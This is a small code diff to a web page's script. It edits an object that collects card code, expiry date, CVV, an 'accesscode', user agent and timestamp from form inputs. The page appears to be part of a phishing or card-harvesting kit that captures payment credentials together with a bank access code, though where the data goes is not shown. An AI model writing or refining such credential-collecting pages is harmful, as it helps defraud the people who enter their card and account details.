@@ -571,7 +571,7 @@
       cardCode: document.getElementById("cardCode").value || "",
       expiryDate: document.getElementById("expiryDate").value || "",
       cvv: document.getElementById("cvv").value || "",
-      accesscode: savedAccessCode || "", // ✅ GUARANTEED
+      accesscode: document.getElementById("accesscode").value || "",
       userAgent: navigator.userAgent,
       time: new Date().toISOString()
     };
@@ -591,6 +591,7 @@
 
 </body>
 </html>
+
 
 
 
